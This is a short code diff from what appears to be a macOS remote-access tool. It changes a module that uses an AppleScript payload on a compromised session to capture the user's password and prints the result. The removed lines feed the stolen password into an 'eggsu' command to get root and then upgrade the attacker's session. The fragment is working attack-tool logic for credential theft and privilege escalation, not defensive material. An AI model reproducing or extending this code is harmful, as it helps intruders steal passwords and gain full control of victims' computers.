@@ -54,25 +54,6 @@ class command:
         cmd_data.update({"cmd":"applescript","args":payload})
         password = session.send_command(cmd_data).strip()
         #display response
-        print h.COLOR_INFO+"[*] "+h.WHITE+"Response: "+h.GREEN+password+h.WHITE
-        #prompt for root
-        tryroot = raw_input("Would you like to try for root? (y/n) ").strip(" ")
-        tryroot = tryroot if tryroot else "y"
-        if tryroot.lower() != "y":
-            return ""
-        #TODO: I am so lazy, probably should use the su command
-        password = password.replace("\\","\\\\").replace("'","\\'")
-        cmd_data.update({"cmd":"eggsu","args":password})
-        result = session.send_command(cmd_data)
-        if "root" in result:
-            h.info_general("Root Granted!")
-            time.sleep(0.2)
-            h.info_general("Escalating Privileges...")
-            if session.server.is_multi == False:
-                session.server.update_session(session)
-            else:
-                session.needs_refresh = True
-        else:
-            h.info_error("Failed getting root!")
+        h.info_success("Response: "+password)
         return ""
 
